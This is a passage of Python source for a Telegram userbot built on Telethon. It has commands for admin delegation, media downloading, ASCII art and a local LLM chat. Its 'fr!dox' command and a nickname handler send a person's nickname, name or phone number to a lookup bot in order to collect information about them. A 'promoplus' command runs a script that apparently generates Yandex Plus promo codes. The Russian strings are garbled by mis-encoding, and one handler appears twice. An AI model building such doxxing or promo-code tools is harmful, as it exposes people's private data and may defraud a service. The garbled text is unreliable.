            await event.reply("‚ùå –£–∫–∞–∂–∏—Ç–µ —Ä–µ–∂–∏–º: owner, all –∏–ª–∏ list")
            return
        admin_mode = args[1]
        await event.reply(f"‚úÖ –†–µ–∂–∏–º –∞–¥–º–∏–Ω–æ–≤ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ `{admin_mode}`.")
    elif cmd == 'add':
        if admin_mode != 'list':
            await event.reply("‚ùå –î–æ–±–∞–≤–ª—è—Ç—å –º–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ –≤ —Ä–µ–∂–∏–º–µ `list`. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —Ä–µ–∂–∏–º —á–µ—Ä–µ–∑ `fr!admin mode list`.")
            return
        if len(args) < 2 or not args[1].isdigit():
            await event.reply("‚ùå –£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π ID –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è.")
            return
        uid = int(args[1])
        admin_list.add(uid)
        await event.reply(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID `{uid}` –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Å–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤.")
    elif cmd == 'remove':
        if admin_mode != 'list':
            await event.reply("‚ùå –£–¥–∞–ª—è—Ç—å –º–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ –≤ —Ä–µ–∂–∏–º–µ `list`. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —Ä–µ–∂–∏–º —á–µ—Ä–µ–∑ `fr!admin mode list`.")
            return
        if len(args) < 2 or not args[1].isdigit():
            await event.reply("‚ùå –£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π ID –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.")
            return
        uid = int(args[1])
        admin_list.discard(uid)
        await event.reply(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID `{uid}` —É–¥–∞–ª—ë–Ω –∏–∑ —Å–ø–∏—Å–∫–∞ –∞–¥–º–∏–Ω–æ–≤.")
    else:
        await event.reply("‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞.")

@client.on(events.NewMessage(pattern=r'^fr!admin (\d+)\s+(.+)$'))
async def delegated_admin_command(event):
    global admin_enabled
    sender_id = event.sender_id

    if not await is_admin(sender_id):
        await event.reply("üö´ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.")
        return

    if not admin_enabled:
        await event.reply("‚ùå –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –æ—Ç–∫–ª—é—á–µ–Ω–æ –≤–ª–∞–¥–µ–ª—å—Ü–µ–º. –í–≤–µ–¥–∏—Ç–µ `fr!admin on` –æ—Ç –≤–ª–∞–¥–µ–ª—å—Ü–∞.")
        return

    target_id = int(event.pattern_match.group(1))
    command_text = event.pattern_match.group(2).strip()

    if target_id != OWNER_USER_ID:
        await event.reply(f"‚ö†Ô∏è –£–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π ID –≤–ª–∞–¥–µ–ª—å—Ü–∞. –î–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ –∫ ID `{OWNER_USER_ID}`.")
        return

    # –≠–º—É–ª–∏—Ä—É–µ–º —Å–æ–±—ã—Ç–∏–µ –æ—Ç OWNER_USER_ID
    fake_event = event
    fake_event.sender_id = OWNER_USER_ID
    fake_event.raw_text = command_text
    fake_event.message.text = command_text
    fake_event.pattern_match = re.match(r'^fr!(.+)$', command_text)

    # –ü—Ä–æ–±—Ä–æ—Å –∫–æ–º–∞–Ω–¥—ã –Ω–∞ –¥–∞–ª—å–Ω–µ–π—à—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É
    await client.dispatcher._handle_event(fake_event)


logging.basicConfig(
    filename='promoplus.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

PYTHON_EXECUTABLE = 'python3' if platform.system() != "Windows" else 'python'

@client.on(events.NewMessage(pattern=r'^fr!promoplus$'))
@owner_only
@vip_only
async def run_yandex_plus_script(event):
    try:
        await event.respond("üöÄ –ó–∞–ø—É—Å–∫–∞—é –≥–µ–Ω–µ—Ä–∞—Ü–∏—é –ø—Ä–æ–º–æ–∫–æ–¥–∞ –Ø–Ω–¥–µ–∫—Å –ü–ª—é—Å...")

        script_path = os.path.join(os.getcwd(), 'addons', 'plus.py')
        if not os.path.exists(script_path):
            await event.respond("‚ùå –§–∞–π–ª plus.py –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –ø–∞–ø–∫–µ addons.")
            logging.error("–§–∞–π–ª plus.py –Ω–µ –Ω–∞–π–¥–µ–Ω.")
            return

        process = await asyncio.create_subprocess_exec(
            PYTHON_EXECUTABLE, 'plus.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.join(os.getcwd(), 'addons')
        )

        # –ß–∏—Ç–∞–µ–º STDOUT –ø–æ—Å—Ç—Ä–æ—á–Ω–æ
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            try:
                text = line.decode().strip()
            except Exception:
                text = line.decode(errors='ignore').strip()

            if text:
                await event.respond(f"<code>{text}</code>", parse_mode='html')
                logging.info(f"[STDOUT] {text}")

        # –ß–∏—Ç–∞–µ–º STDERR (–µ—Å–ª–∏ —Å–∫—Ä–∏–ø—Ç —á—Ç–æ-—Ç–æ –≤—ã–≤–µ–ª –≤ –æ—à–∏–±–∫—É)
        stderr_output = await process.stderr.read()
        if stderr_output:
            err_text = stderr_output.decode(errors='ignore').strip()
            if err_text:
                await event.respond(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:\n<code>{err_text}</code>", parse_mode='html')
                logging.warning(f"[STDERR] {err_text}")

        await process.wait()

        await event.respond("‚úÖ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø—Ä–æ–º–æ–∫–æ–¥–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
        logging.info("–°–∫—Ä–∏–ø—Ç plus.py –∑–∞–≤–µ—Ä—à–∏–ª –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ.")

    except Exception as e:
        msg = f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞: {e}"
        await event.respond(msg)
        logging.exception("–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã fr!promoplus")
        
@client.on(events.NewMessage(pattern='^fr!gif '))
@owner_only
async def gif_command(event):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É !gif."""
    query = event.message.text[6:].strip()  # –£–±–∏—Ä–∞–µ–º "fr!gif " –∏ –ª–∏—à–Ω–∏–µ –ø—Ä–æ–±–µ–ª—ã
    
    if not query:
        await event.respond("‚ùå –£–∫–∞–∂–∏—Ç–µ –ø–æ–∏—Å–∫–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å: fr!gif <–∑–∞–ø—Ä–æ—Å>")
        return
    
    gif_url = await get_gif_url(query)

    if gif_url:
        try:
            await client.send_file(event.chat_id, gif_url, caption=f"GIF –ø–æ –∑–∞–ø—Ä–æ—Å—É: {query}")
        except Exception as e:
            logging.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ GIF: {e}")
            await event.respond("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å GIF")
    else:
        await event.respond(f"üîç –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ GIF –¥–ª—è: {query}")

@client.on(events.NewMessage(pattern=r'^fr!dox(?: (.*))?'))
@owner_only
async def dox_command(event):
    """
    –ü–æ–∏—Å–∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∏ –ø–µ—Ä–µ—Å—ã–ª–∫–∞ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.
    –§–æ—Ä–º–∞—Ç: fr!dox <–ª—é–±–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è> 
    """
    args = event.pattern_match.group(1)
    
    if not args:
        await event.respond("‚ùå –£–∫–∞–∂–∏—Ç–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –¥–ª—è –ø–æ–∏—Å–∫–∞: fr!dox <–Ω–∏–∫/–∏–º—è/–Ω–æ–º–µ—Ä>")
        return
    
    try:
        # –ó–∞–º–µ–Ω—è–µ–º @username –Ω–∞ t.me/username
        if args.startswith('@'):
            args = f"t.me/{args[1:]}"
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –≤ –±–æ—Ç–∞
        await send_to_bot(client, event, BOT_USERNAME, args)
        
        # –ü–µ—Ä–µ—Å—ã–ª–∞–µ–º –∏—Å—Ö–æ–¥–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ (–µ—Å–ª–∏ –∫–æ–º–∞–Ω–¥–∞ –≤—ã–∑–≤–∞–Ω–∞ –æ—Ç–≤–µ—Ç–æ–º)
        if event.is_reply:
            replied_msg = await event.get_reply_message()
            await client.forward_messages(BOT_USERNAME, replied_msg)
            
    except Exception as e:
        await event.respond(f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")

import json
import urllib.request
import logging
from telethon import events

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –≤ –∫–æ–Ω—Å–æ–ª—å
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

if ENABLE_FR_AI:
    from transformers import pipeline
    from llama_cpp import Llama
    import os

    logging.disable(logging.CRITICAL)  # –ú–æ–∂–Ω–æ –≤–æ–æ–±—â–µ —É–±—Ä–∞—Ç—å, –µ—Å–ª–∏ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—à—å logging

    model_dir = "models"
    model_path = os.path.join(".", model_dir, ai_model)
    llm = Llama(model_path=os.path.join("models", ai_model), n_ctx=131072, n_threads=6, verbose=False)

    @client.on(events.NewMessage(pattern=r'^fr!AI(?: (.*))?'))
    @owner_only
    async def handle_fr_ai(event):
        user_input = event.pattern_match.group(1)

        if not user_input:
            await event.respond("‚ö†Ô∏è –ò—Å–ø–æ–ª—å–∑—É–π: `fr!AI <—Ç–µ–∫—Å—Ç>`")
            return

        await event.respond("‚è≥ –ì–µ–Ω–µ—Ä–∏—Ä—É—é –æ—Ç–≤–µ—Ç...")

        try:
            prompt = (
                "–¢—ã —É–º–Ω—ã–π, —Ä–∞–∑–≥–æ–≤–æ—Ä–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫. –û—Ç–≤–µ—á–∞–π –Ω–∞ —Ä—É—Å—Å–∫–æ–º —è–∑—ã–∫–µ, –ø–æ–Ω—è—Ç–Ω–æ –∏ –ø–æ —Å—É—â–µ—Å—Ç–≤—É.\n"
                f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user_input}\n"
                "–û—Ç–≤–µ—Ç:"
            )
            result = llm(
                prompt,
                max_tokens=512,
                temperature=0.7,
                top_p=0.9,
                stop=["\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:", "\n–û—Ç–≤–µ—Ç:"]
            )
            reply = result["choices"][0]["text"].strip()

            if not reply:
                reply = "‚ùå –ú–æ–¥–µ–ª—å –Ω–µ —Å–º–æ–≥–ª–∞ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –æ—Å–º—ã—Å–ª–µ–Ω–Ω—ã–π –æ—Ç–≤–µ—Ç."

            await event.respond(f"ü§ñ –û—Ç–≤–µ—Ç:\n\n{reply}")

        except Exception:
            await event.respond("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Ç–µ–∫—Å—Ç–∞.")

else:
    print(f"{WARNING_COLOR}–ö–æ–º–∞–Ω–¥–∞ fr!AI –æ—Ç–∫–ª—é—á–µ–Ω–∞, –º–æ–¥–µ–ª—å –Ω–µ –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –∏ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–µ —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è.{RESET_COLOR}")




from pyfiglet import figlet_format

def image_to_ascii(img, width=80):
    img = img.convert("L")  # grayscale
    aspect_ratio = img.height / img.width
    new_height = int(aspect_ratio * width * 0.5)
    img = img.resize((width, new_height))
    pixels = np.array(img)

    ascii_str = ""
    for row in pixels:
        for pixel in row:
            p = int(pixel)  # —è–≤–Ω–æ–µ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ uint8 -> int
            index = min(p * len(ASCII_CHARS) // 256, len(ASCII_CHARS) - 1)
            ascii_str += ASCII_CHARS[index]
        ascii_str += "\n"
    return ascii_str

def render_text_to_image(text, font_size=40):
    font = ImageFont.load_default()  # –î–ï–§–û–õ–¢–ù–´–ô –®–†–ò–§–¢

    # –û—Ü–µ–Ω–∫–∞ —Ä–∞–∑–º–µ—Ä–æ–≤ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è —á–µ—Ä–µ–∑ textbbox
    dummy_img = Image.new("L", (1, 1))
    draw = ImageDraw.Draw(dummy_img)
    bbox = draw.textbbox((0, 0), text, font=font)
    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]

    img = Image.new("L", (text_width + 10, text_height + 10), color=255)
    draw = ImageDraw.Draw(img)
    draw.text((5, 5), text, font=font, fill=0)
    return img

@client.on(events.NewMessage(pattern=r'^fr!ascii (.+)'))
@owner_only
async def ascii_art_handler(event):
    text = event.pattern_match.group(1)
    
    if re.search('[–∞-—è–ê-–Ø]', text):
        await event.respond("–û—à–∏–±–∫–∞: —Ä—É—Å—Å–∫–∏–π —Ç–µ–∫—Å—Ç –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –ª–∞—Ç–∏–Ω–∏—Ü—É –∏ —Ü–∏—Ñ—Ä—ã.")
        return
    
    ascii_text = Figlet().renderText(text)
    response = f"```\n {ascii_text[:1999]}{'...' if len(ascii_text) > 1999 else ''}\n```"
    await event.respond(response, parse_mode='markdown')

@client.on(events.NewMessage(pattern=r'^fr!readall$'))
@owner_only
async def read_all_handler(event):
    dialogs = await client.get_dialogs()
    for dialog in dialogs:
        if dialog.unread_count > 0:
            await client.send_read_acknowledge(dialog.entity)
    await event.respond("‚úÖ –í—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–º–µ—á–µ–Ω—ã –∫–∞–∫ –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω—ã–µ")

@client.on(events.NewMessage(pattern=r'^fr!ping$'))
async def ping_handler(event):
    start = time.time()
    message = await event.respond('üèì Pong!')
    end = time.time()
    latency = round((end - start) * 1000, 2)
    await message.edit(f'üèì Pong! | {latency}ms')

@client.on(events.NewMessage(pattern=r'^fr!id$'))
async def id_handler(event):
    await event.respond(f"üë§ –í–∞—à ID: `{event.sender_id}`\nüí¨ ID —á–∞—Ç–∞: `{event.chat_id}`",
                        parse_mode='markdown')

@client.on(events.NewMessage(pattern=r'^fr!admin (on|off)$'))
@owner_only
async def admin_handler(event):
    global admin_enabled
    cmd = event.pattern_match.group(1).lower()
    if cmd == "on":
        admin_enabled = True
        await event.respond("‚úÖ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–æ—Ç–æ–º –¥—Ä—É–≥–∏–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ.")
    else:
        admin_enabled = False
        await event.respond("‚ùå –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–æ—Ç–æ–º –¥—Ä—É–≥–∏–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏ –∑–∞–ø—Ä–µ—â–µ–Ω–æ.")
        
@client.on(events.NewMessage(pattern=r'^fr!ascii (.+)'))
@owner_only
async def ascii_art_handler(event):
    text = event.pattern_match.group(1)
    
    if re.search('[–∞-—è–ê-–Ø]', text):
        await event.respond("–û—à–∏–±–∫–∞: —Ä—É—Å—Å–∫–∏–π —Ç–µ–∫—Å—Ç –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –ª–∞—Ç–∏–Ω–∏—Ü—É –∏ —Ü–∏—Ñ—Ä—ã.")
        return
    
    ascii_text = Figlet().renderText(text)
    # –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–±–µ–ª –≤ –Ω–∞—á–∞–ª–µ –∏ –æ–±—Ä–µ–∑–∞–µ–º –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
    response = f"```\n {ascii_text[:1999]}{'...' if len(ascii_text) > 1999 else ''}\n```"
    await event.respond(response, parse_mode='markdown')
        
@client.on(events.NewMessage)
async def handle_nickname_input(event):
    chat_id = event.chat_id
    if pending_dox_requests.get(chat_id) and event.sender_id == (await get_owner_id()):
        nickname = event.text
        # –ü–†–û–í–ï–†–ö–ê –ù–ò–ö–ù–ï–ô–ú–ê!!!!
        if not re.match(r'^[a-zA-Z0-9_]{5,32}$', nickname):
            await event.respond("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
            del pending_dox_requests[chat_id]
            return
        info_text = f"t.me/{nickname}"
        try:
            await send_to_bot(client, event, BOT_USERNAME, info_text)
        except Exception as e:
            logging.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ BOT_USERNAME: {e}")
            await event.respond("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ!")
        del pending_dox_requests[chat_id]  # –£–±–∏—Ä–∞–µ–º –∏–∑ –æ–∂–∏–¥–∞–Ω–∏—è
        
# ==== –£—Ç–∏–ª–∏—Ç–∞ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è ID –≤–∏–¥–µ–æ –∏–∑ —Å—Å—ã–ª–∫–∏ –∏–ª–∏ —Å—Ç—Ä–æ–∫–∏ ====
def extract_video_id(url_or_id):
    match = re.search(r"(?:v=|youtu\.be/)([a-zA-Z0-9_-]{11})", url_or_id)
    if match:
        return match.group(1)
    if len(url_or_id) == 11:
        return url_or_id
    return None

# ==== –ö–æ–º–∞–Ω–¥–∞ fr!video –¥–ª—è Telethon userbot ====
import os
import re
from yt_dlp import YoutubeDL
from telethon import events

pending_downloads = {}  # chat_id -> {'url': url, 'formats': {res: format_code}}

def format_duration(seconds: int) -> str:
    return f"{seconds//60}:{seconds%60:02d}"

def is_url(text: str) -> bool:
    return re.match(r'https?://', text) is not None

@client.on(events.NewMessage(pattern=r'^fr!video (.+)$'))
@owner_only
async def handle_video_request(event):
    chat_id = event.chat_id
    user_input = event.pattern_match.group(1).strip()

    url = user_input if is_url(user_input) else f"ytsearch:{user_input}"

    ydl_opts = {
        'quiet': True,
        'no_warnings': True,
        'skip_download': True,
        'noplaylist': True,
    }

    try:
        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)

        if 'entries' in info:
            info = info['entries'][0]

        formats = {}
        for f in info.get('formats', []):
            if (
                f.get('acodec') != 'none' and
                f.get('vcodec') != 'none' and
                f.get('ext') == 'mp4' and
                f.get('height')
            ):
                res = str(f['height'])
                formats[res] = f['format_id']

        if not formats:
            await event.respond("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –ø–æ–¥—Ö–æ–¥—è—â–∏–µ —Ñ–æ—Ä–º–∞—Ç—ã –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è.")
            return

        sorted_res = sorted(formats.keys(), key=lambda x: int(x))

        pending_downloads[chat_id] = {
            'url': info['webpage_url'],
            'formats': formats,
        }

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ–±–ª–æ–∂–∫—É, –µ—Å–ª–∏ –µ—Å—Ç—å
        thumbnail = info.get('thumbnail')
        if thumbnail:
            await client.send_file(chat_id, thumbnail)

        caption = (
            f"üìπ –ù–∞–∑–≤–∞–Ω–∏–µ: {info.get('title', '–ë–µ–∑ –Ω–∞–∑–≤–∞–Ω–∏—è')}\n"
            f"üë§ –ê–≤—Ç–æ—Ä: {info.get('uploader', '–ù–µ–∏–∑–≤–µ—Å—Ç–µ–Ω')}\n"
            f"‚è± –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {format_duration(info.get('duration', 0))}\n\n"
            f"–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–∞—á–µ—Å—Ç–≤–∞ –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è:\n"
            + "\n".join(f"{res}p" for res in sorted_res) + "\n\n"
            "–ù–∞–ø–∏—à–∏—Ç–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä, '—Å–∫–∞—á–∞—Ç—å 480p' –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –≤ –≤—ã–±—Ä–∞–Ω–Ω–æ–º –∫–∞—á–µ—Å—Ç–≤–µ."
        )

        await event.respond(caption)

    except Exception as e:
        await event.respond(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ: {str(e)}")

@client.on(events.NewMessage)
async def handle_download_confirmation(event):
    chat_id = event.chat_id
    text = event.raw_text.strip().lower()

    if chat_id in pending_downloads:
        data = pending_downloads[chat_id]
        url = data['url']
        formats = data['formats']

        m = re.search(r'(\d{3,4})', text)
        if (text.startswith('—Å–∫–∞—á–∞—Ç—å') and m) or (text.isdigit() and text in formats):
            res = m.group(1) if m else text
            if res not in formats:
                await event.respond(f"‚ùå –ö–∞—á–µ—Å—Ç–≤–æ {res}p –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ. –í—ã–±–µ—Ä–∏—Ç–µ –∏–∑ —Å–ø–∏—Å–∫–∞.")
                return

            format_code = formats[res]

            msg = await event.respond(f"‚è¨ –í–∏–¥–µ–æ –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –≤ {res}p, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...")

            ydl_opts = {
                'format': format_code,
                'outtmpl': f'yt_%(title)s_{res}p.%(ext)s',
                'merge_output_format': 'mp4',
                'quiet': True,
                'no_warnings': True,
                'noplaylist': True,
            }

            try:
                with YoutubeDL(ydl_opts) as ydl:
                    info = ydl.extract_info(url, download=True)
                    filename = ydl.prepare_filename(info)

                caption = (
                    f"üìπ {info.get('title', '–ë–µ–∑ –Ω–∞–∑–≤–∞–Ω–∏—è')}\n"
                    f"üë§ –ê–≤—Ç–æ—Ä: {info.get('uploader', '–ù–µ–∏–∑–≤–µ—Å—Ç–µ–Ω')}\n"
                    f"‚è± –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {format_duration(info.get('duration', 0))}\n"
                    f"üîó –°—Å—ã–ª–∫–∞: {info.get('webpage_url', url)}\n\n"
                )

                await client.send_file(chat_id, filename, caption=caption)
                await msg.delete()

                os.remove(filename)

            except Exception as e:
                await msg.edit(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏: {str(e)}")

            pending_downloads.pop(chat_id, None)

        elif text in ['—Å–∫–∞—á–∞—Ç—å', '–¥–∞', '–æ–∫', 'download']:
            sorted_res = sorted(formats.keys(), key=lambda x: int(x))
            await event.respond(
                "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –∫–∞—á–µ—Å—Ç–≤–æ –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è.\n"
                "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–∞—á–µ—Å—Ç–≤–∞:\n" + "\n".join(f"{res}p" for res in sorted_res) + "\n\n"
                "–ù–∞–ø–∏—à–∏—Ç–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä, '—Å–∫–∞—á–∞—Ç—å 480' –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ '480'."
            )
        
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s:%(message)s')
        
@client.on(events.NewMessage(pattern=r'^fr!music (yt|sc) (.+)'))
@owner_only
async def music_handler(event):
    source = event.pattern_match.group(1)
    query = event.pattern_match.group(2).strip()
    chat = await event.get_chat()

    msg = await event.respond(f"–ò—â—É –º—É–∑—ã–∫—É –Ω–∞ {source}... ‚è≥")

    os.makedirs('downloads', exist_ok=True)

    ydl_opts = {
        'format': 'bestaudio/best',
        'outtmpl': 'downloads/%(title)s.%(ext)s',
        'quiet': True,
        'no_warnings': True,
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',
            'preferredquality': '192',
        }],
        'progress_hooks': [],
    }

    loop = asyncio.get_event_loop()

    async def progress_hook(d):
        status = d.get('status')
        downloaded = d.get('downloaded_bytes', 0)
        total = d.get('total_bytes') or d.get('total_bytes_estimate')
        percent = (downloaded / total * 100) if total else 0

        if status == 'downloading':
            text = f"–°–∫–∞—á–∏–≤–∞–Ω–∏–µ: {percent:.1f}%"
        elif status == 'finished':
            text = f"–°–∫–∞—á–∏–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ: 100%. –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è..."
        else:
            text = f"–°—Ç–∞—Ç—É—Å: {status}"

        try:
            await msg.edit(text)
        except Exception:
            pass

    def hook(d):
        asyncio.run_coroutine_threadsafe(progress_hook(d), loop)

    ydl_opts['progress_hooks'].append(hook)

    try:
        if source == 'yt':
            url = f"ytsearch1:{query}"
        elif source == 'sc':
            url = f"scsearch1:{query}"
        else:
            await msg.edit("–ò—Å—Ç–æ—á–Ω–∏–∫ –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω.")
            return

        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if 'entries' in info:
                info = info['entries'][0]

            filename_base = ydl.prepare_filename(info)
            filename = os.path.splitext(filename_base)[0] + ".mp3"

        await msg.edit(f"–û—Ç–ø—Ä–∞–≤–ª—è—é: {info.get('title', '–¢—Ä–µ–∫')} üéµ")
        await client.send_file(chat, filename)
        os.remove(filename)

    except Exception as e:
        await msg.edit("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏ –∏–ª–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –º—É–∑—ã–∫–∏.")
        logging.exception("–û—à–∏–±–∫–∞ music_handler:")




@client.on(events.NewMessage(pattern=r'fr!tg (\S+)(?: (id))?'))
@owner_only
async def stat_command(event):
    args = event.pattern_match.group(1)  # –ù–∏–∫ –∏–ª–∏ ID
    is_id = event.pattern_match.group(2)  # 'id' –µ—Å–ª–∏ —É–∫–∞–∑–∞–Ω

    if not args:
        await event.respond("‚ùå –£–∫–∞–∂–∏—Ç–µ username –∏–ª–∏ ID: fr!tg <–Ω–∏–∫> –∏–ª–∏ fr!tg <ID> id")
        return

    query = args if is_id else args.lstrip('@')

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è —é–∑–µ—Ä–Ω–µ–π–º–∞, –µ—Å–ª–∏ —ç—Ç–æ –Ω–µ ID
    if not is_id:
        try:
            await client(ResolveUsernameRequest(query))
        except (UsernameNotOccupiedError, UsernameInvalidError):
            await event.respond("‚ùå –û—à–∏–±–∫–∞: –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ username –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω.")
            return
        except Exception as e:
            await event.respond(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ username: {e}")
            return

    try:
